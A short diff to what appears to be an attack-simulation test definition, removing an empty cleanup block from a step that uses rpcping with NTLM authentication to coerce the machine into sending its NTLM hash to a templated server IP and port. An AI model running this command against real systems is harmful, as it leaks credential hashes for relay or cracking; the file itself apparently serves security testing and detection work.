@@ -21,6 +21,3 @@ steps:
     - name: send-ntlm-hash-with-rpc-test-connection
       inline: rpcping -s {{.Args.server_ip}} -e {{.Args.custom_port}} -a privacy -u NTLM 1>$Null
       executor: powershell
-      cleanup:
-        inline: ""
-        executor: powershell
